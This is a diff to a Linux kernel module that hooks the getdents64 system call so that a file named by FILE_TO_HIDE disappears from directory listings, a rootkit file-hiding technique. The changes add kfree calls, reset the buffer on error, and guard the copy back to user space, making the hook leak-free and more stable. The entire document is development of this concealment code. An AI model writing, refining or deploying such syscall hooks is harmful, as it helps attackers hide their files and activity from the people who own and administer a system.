@@ -66,6 +66,7 @@ static struct filtered_dirent filter_file_from_getdents(char __user *buffer, uns
     }
     if (!filtered_buffer)
     {
+        kfree(kbuffer);
         pr_err("Idan's module failed to allocate filtered_buffer");
         return fid;
     }
@@ -73,6 +74,7 @@ static struct filtered_dirent filter_file_from_getdents(char __user *buffer, uns
     fid.buffer = filtered_buffer;
     if (copy_from_user(kbuffer, buffer, bytes) != 0)
     {
+        kfree(kbuffer);
         pr_err("Idan's module failed to copy from user");
         return fid;
     }
@@ -83,9 +85,10 @@ static struct filtered_dirent filter_file_from_getdents(char __user *buffer, uns
         pos += dp->d_reclen;
         if (dp->d_reclen == 0)
         {
+            kfree(kbuffer);
+            kfree(filtered_buffer);
             pr_err("Idan's module found taht d_reclen is 0");
-            fid.size = bytes;
-            fid.buffer = kbuffer;
+            fid.buffer = NULL;
             return fid;
         }
         if (strcmp(dp->d_name, filter) != 0)
@@ -114,8 +117,9 @@ static asmlinkage int modified_getdents64(const struct pt_regs *regs)
     fid = filter_file_from_getdents((char *)dirent, bytes, FILE_TO_HIDE);
     if (fid.buffer)
     {
-        if (copy_to_user(dirent, fid.buffer, fid.size) != 0)
+        if (fid.size != 0 && copy_to_user(dirent, fid.buffer, fid.size) != 0)
         {
+            kfree(fid.buffer);
             pr_err("Idan's module failed to copy to user");
             return -EFAULT;
         }
